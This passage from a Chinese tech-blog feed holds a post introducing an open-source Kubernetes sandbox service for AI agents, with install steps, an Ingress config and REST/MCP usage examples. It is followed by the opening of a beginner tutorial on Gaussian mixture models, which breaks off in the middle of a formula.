<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd30fc6012734a5fa856083afe6722a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=AEtNd%2Fm0Gc13tmvtYRB8Q4uV2v0%3D" alt="gitdemo" loading="lazy"/></p>
<p>在我们的业务中，经常需要让Agent执行一些代码或者访问网站等，例如用户提供了一个excel文件，处理里面的一些数据，最终生成报告，或者用户提供了一个网站，让Agent访问网站，然后获取一些数据，最终生成报告。</p>
<p>这些都是很常见的场景，例如最近非常受关注的Manus，卖了很多钱的那个（羡慕啊～）,它就是利用了各种工具来完成用户的复杂任务，你们知道的。</p>
<p>但问题来了，我们如何让Agent执行这些代码或者访问网站呢？</p>
<p>因此Manus把E2B带火了，E2B是一个非常强大的Sandbox工具，它可以帮助Agent执行代码或命令，但是E2B基本上是个商业的，不方便我们使用，之前我们的办法是部署一个Python的执行代码的服务，或着部署一个Playwright的服务，各自提供MCP或普通API，来满足需求，但是遇到的问题也是显而易见的，那就是无法实现多次访问的隔离，例如一个Agent访问了A网站，另一个Agent访问了B网站，就会相互干扰，性能也是问题，除非你部署很多实例，那也浪费。</p>
<p>这个问题你们是怎么解决的？</p>
<h2 data-id="heading-1">2，Agent-Sandbox</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c30c3a67cd6464eb96e15f4f5f44972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=UQvNBHLe5nfincJRw5Dw2ZMV3g0%3D" alt="sbarch.jpg" loading="lazy"/></p>
<p>没有选择，只能自己搞了，上半年我们拉了几个兄弟，按照以上的痛点，开发了一个Agent-Sandbox，是的，名字就叫<strong>Agent-Sandbox</strong>，是不是很技术流，</p>
<p>目前已经在生产环境使用了，效果还不错，支持MCP和REST API，Agent可以在任何需要的时候创建一个Sandbox，然后执行代码，访问网站等，完事儿后自己删除Sandbox，非常方便。</p>
<p>不过最近也发现市面上出现很多关于Agent Sandbox的工具和讨论，开源的包括<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkubernetes-sigs%2Fagent-sandbox" target="_blank" title="https://github.com/kubernetes-sigs/agent-sandbox" ref="nofollow noopener noreferrer">kubernetes-sigs/agent-sandbox</a> 、 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-infra%2Fsandbox" target="_blank" title="https://github.com/agent-infra/sandbox" ref="nofollow noopener noreferrer">AIO Sandbox</a> 等，说明大家也在解决这个问题，AIO Sandbox这个是火山的，只提供一个集成化的Sandbox环境，也就是一个Docker的Image，里面有各种工具，包括执行代码、浏览器、文件系统等，而kubernetes-sigs/agent-sandbox是个部署工具，可以部署各种Sandbox环境，例如他就支持部署AIO Sandbox，可以通过它拉起很多AIO Sandbox的实例，但功能还是太基础了，无法直接给Agent使用，安装也麻烦，要求的Kubernetes版本比较高，目前大家生产用的K8S的版本都比较滞后。</p>
<p>像我们这样开源的Sandbox还是没有看到，我们就决定把我们这个开源给大家，也许大家跟我们希望的一样，那就可以用得上了。</p>
<h3 data-id="heading-2">开源地址：</h3>
<p><strong>Agent-Sandbox</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-sandbox%2Fagent-sandbox" target="_blank" title="https://github.com/agent-sandbox/agent-sandbox" ref="nofollow noopener noreferrer">github.com/agent-sandb…</a></p>
<h2 data-id="heading-3">3，Agent-Sandbox有哪些特点？</h2>
<p>目前实现了主要的功能，包括通过MCP或REST API来CRUD Sandbox，指定Sandbox的Image等，后续会支持更多场景的Sandbox运行环境，支持各种SDK，来满足编程场景的Sandbox控制，更多Sandbox的管理功能，包括TTL回收、无调用回收等，以及管理UI，可以看到在创建的全部Sandbox和相关操作，也可以通过这个UI来创建Sandbox等，方便与治理。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc020af4a6c44d3fb9dd606bfcab5a8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=USDr4W9j6BbMduqXS%2Bg3e21k73Q%3D" alt="full-lifecycle-demo.png" loading="lazy"/></p>
<h3 data-id="heading-4">特性：</h3>
<ol>
<li>Ai使用友好，可以直接让Agent控制Sandbox的全生命周期，而不一定得提前创建好，在给Agent去使用，Agent按需创建和回收；</li>
<li>生态开放，部署的Sandbox运行环境可以与社区的兼容，列如可以直接拉起前面提到的AIO Sandbox、Code Server或Playwright等，方便大家利用现有的资源，当然，可以自定义运行环境；</li>
<li>企业生产可用，当然，考虑前面提到的痛点，基于K8S开发，支持规模化使用，根据需要，可以大量创建Sandbox，相互之间隔离使用；</li>
<li>轻量化，就一个组件，没有采用K8S的CRD来开发，这个后续用户按照和升级都比较麻烦，用户得接受一种新的资源类型，我们采用RS+Label的方式，尽量依赖K8S现有的特性来快速实现。</li>
</ol>
<h2 data-id="heading-5">4，如何使用Agent-Sandbox？</h2>
<p>所以怎么使用呢，过程非常简单，主要分两步：</p>
<h3 data-id="heading-6">1，部署Agent-Sandbox</h3>
<p>要求 <strong>Kubernetes version 1.26</strong> 或以上， 在 <code>https://github.com/agent-sandbox/agent-sandbox</code> 下载 <code>install.yaml</code> 后，</p>
<pre><code class="hljs language-bash" lang="bash">kubectl create namespace agent-sandbox
kubectl apply -nagent-sandbox -f install.yaml
</code></pre>
<p>里面会安装deployment、service等，之后你应该是需要配置一个ingress，如：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">agent-sandbox</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">agent-sandbox</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">ingressClassName:</span> <span class="hljs-string">ingress-nginx</span>
  <span class="hljs-attr">rules:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">agent-sandbox.your-host.com</span>
      <span class="hljs-attr">http:</span>
        <span class="hljs-attr">paths:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-attr">backend:</span>
              <span class="hljs-attr">service:</span>
                <span class="hljs-attr">name:</span> <span class="hljs-string">agent-sandbox</span>
                <span class="hljs-attr">port:</span>
                  <span class="hljs-attr">number:</span> <span class="hljs-number">80</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/(.*)</span>
</code></pre>
<p>主要是 <code>host</code> 需要你给出，其他可以直接使用。</p>
<h3 data-id="heading-7">2，使用Agent-Sandbox</h3>
<h4 data-id="heading-8">2.1，通过Agent-Sandbox MCP Server</h4>
<p>Agent-Sandbox MCP Server 地址： <code>http://agent-sandbox.your-host.com/mcp</code> ，提供了Sandbox的CURD等Tools。</p>
<p><strong>效果测试：</strong></p>
<p>一个简单的Demo，Agent 写个斐波那契额函数，然后通过MCP Server创建一个Sandbox，来计算，最后删除Sandbox。</p>
<p><em>是个Gif动画，如果不播放，可以新窗口打开。</em></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0369337f8ad474899492beeefa6b76f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=zrvxsy7v6KCnWXLdwFE4gP96L5s%3D" alt="gitdemo" loading="lazy"/></p>
<p><em>更多演示请关注：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-sandbox%2Fagent-sandbox" target="_blank" title="https://github.com/agent-sandbox/agent-sandbox" ref="nofollow noopener noreferrer">github.com/agent-sandb…</a></em></p>
<h4 data-id="heading-9">2.2，通过Agent-Sandbox RESTful API</h4>
<p>Agent-Sandbox提供RESTful API来管理Sandbox，典型的工作流程包括创建Sandbox、访问Sandbox、删除Sandbox。</p>
<p><strong>a，创建一个Sandbox</strong></p>
<pre><code class="hljs language-shell" lang="shell">curl --location '/api/v1/sandbox' \
--header 'Content-Type: application/json' \
--data '{"name":"sandbox-01"}'
</code></pre>
<p>默认会拉起AIO Sandbox，可以通过以下方式，指定国内镜像，</p>
<pre><code class="hljs language-shell" lang="shell">curl --location '/api/v1/sandbox' \
--header 'Content-Type: application/json' \
--data '{"name":"sandbox-01","image":"enterprise-public-cn-beijing.cr.volces.com/vefaas-public/all-in-one-sandbox:latest"}'
</code></pre>
<p><strong>b，访问Sandbox</strong>
<code>/sandbox/{sandbox_name}</code> 通过这个地址可以访问Sandbox,</p>
<p>例如刚才创建的 <strong>sandbox-01</strong> 访问地址是： <code>/sandbox/sandbox-01</code>.</p>
<p>访问后你应该会看到：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f5d9a6f1af04639a140680313eaa343~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=0gDO6%2BCsBd4thSdWT3eMy7kXick%3D" alt="aio-demo.jpg" loading="lazy"/></p>
<p>访问这个Sandbox的MCP地址是： <code>http://agent-sandbox.your-host.com/sandbox/sandbox-01/mcp</code> ，这种场景是先创建好Sandbox，然后让Agent去访问这个Sandbox。</p>
<p><strong>c，删除Sandbox</strong></p>
<p>删除API： <code>/api/v1/sandbox/{sandbox_name}</code> . 例如删除Sandbox <code>sandbox-01</code> :
<strong>Shell</strong></p>
<pre><code class="hljs language-shell" lang="shell">curl --location --request DELETE '/api/v1/sandbox/sandbox-01'
</code></pre>
<p><strong>结果:</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Sandbox sandbox-01 deleted successfully"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-10">结尾</h2>
<p>以上就是Agent-Sandbox的简单介绍和使用方法，更多内容请关注<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-sandbox%2Fagent-sandbox" target="_blank" title="https://github.com/agent-sandbox/agent-sandbox" ref="nofollow noopener noreferrer">Agent-Sandbox</a>项目，后续我们会持续更新更多功能和特性，包括提到的支持更多场景的Sandbox运行环境，支持各种SDK来满足编程场景的Sandbox控制，更多Sandbox的管理功能，包括TTL回收、无调用回收，并发弹性伸缩等，以及管理UI，可以看到和管理创建的全部Sandbox，也可以通过这个UI来创建和操作Sandbox，例如上传下载文件、查看日志、执行命令、查看状态等。</p>
<p>最后欢迎大家关注和PR~，我们会持续进化！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[混合高斯模型全解析：原理，应用与代码实现]]></title>    <link>https://juejin.cn/post/7592922036092223503</link>    <guid>https://juejin.cn/post/7592922036092223503</guid>    <pubDate>2026-01-09T05:36:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592922036092223503" data-draft-id="7592873628586934272" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="混合高斯模型全解析：原理，应用与代码实现"/> <meta itemprop="keywords" content="机器学习"/> <meta itemprop="datePublished" content="2026-01-09T05:36:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Narrastory"/> <meta itemprop="url" content="https://juejin.cn/user/4355593566170010"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            混合高斯模型全解析：原理，应用与代码实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4355593566170010/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Narrastory
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:36:10.000Z" title="Fri Jan 09 2026 05:36:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="ocean">.hljs-comment,.hljs-quote{color:#65737e}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#bf616a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#d08770}.hljs-attribute{color:#ebcb8b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#a3be8c}.hljs-section,.hljs-title{color:#8fa1b3}.hljs-keyword,.hljs-selector-tag{color:#b48ead}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b303b;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">混合高斯模型全解析：原理，应用与代码实现</h2>
<p><code>ming | 2026.01</code></p>
<hr/>
<div align="center">
  <img align="center" src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9c1ceaf52c9469d9095262eb3561c4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=H5QUeYEjP41tusjW8kv1MuJqJ4c%3D" alt="AI Generated Art" width="90%" loading="lazy"/>
</div>
<p>如果你对混合高斯模型（GMM）还不太了解，不知道它能做什么，也完全没关系——本文正是为此而写。你只需要具备最基础的高斯分布（也称正态分布）知识即可轻松跟上。</p>
<p>这是一篇面向初学者的教程，本文将重点放在混合高斯分布的<strong>核心概念</strong>与<strong>数学流程</strong>的梳理上，并会手把手带你用代码完成一个实际的应用示例。至于更深层的数学思想与模型设计方法技巧，本文暂不深入讨论，以帮助大家更快上手、理解该模型的核心用法。</p>
<p><em>本文中展示的示意图均为作者使用matplotlib原创绘制。读者可自由分享使用，但使用时请注明出处。</em></p>
<hr/>
<p>我们从最基础的高斯分布（也称正态分布）说起。以下这个概率密度函数想必大家再熟悉不过了，它不仅是概率论与统计中的核心分布，也是机器学习众多模型的基石：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>μ</mi><mo separator="true">,</mo><mi>σ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><msqrt><mrow><mn>2</mn><mi>π</mi></mrow></msqrt><mi>σ</mi></mrow></mfrac><msup><mi>e</mi><mfrac><mrow><mo>−</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mi>μ</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msup><mi>σ</mi><mn>2</mn></msup></mrow></mfrac></msup></mrow><annotation encoding="application/x-tex">\mathcal{N}(x|\mu,\sigma) = \frac{1}{\sqrt{2\pi}\sigma} e^{\frac{-(x-\mu )^{2}}{2\sigma^{2}} }</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal">μ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.2591em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.2028em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9072em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span><span style="top:-2.8672em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1328em;"><span/></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.3291em;"><span style="top:-3.4534em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.251em;"><span style="top:-2.5062em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9384em;"><span style="top:-2.9384em;margin-right:0.1em;"><span class="pstrut" style="height:2.6444em;"/><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"/><span class="frac-line mtight" style="border-bottom-width:0.049em;"/></span><span style="top:-3.5021em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">μ</span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0484em;"><span style="top:-3.0484em;margin-right:0.1em;"><span class="pstrut" style="height:2.6444em;"/><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4938em;"><span/></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"/></span></span></span></span></span></span></span></span></span></span></span></span></span></div>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/634b6fff2389458db73b59ee44a419b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=WZGRqEFuFO8nYrItKROgtaNfngA%3D" alt="c1.jpg" loading="lazy"/></p>
<p>即使你之前已经学过，我们这里不妨一起回顾一下它的几个关键特性。该分布是关于<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span>的函数，并由两个参数决定：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">μ</span></span></span></span></span>：均值，决定分布的中心位置，即对称轴所在；（读音为mu|缪）</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></span>：标准差，控制分布的离散程度；（读音为sigma | C个码）</li>
</ul>
<p>具体来说，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></span> 越大，曲线越“矮胖”，数据越分散；<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></span> 越小，曲线越“高瘦”，数据越集中。下图直观展示了对不同 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">μ</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" 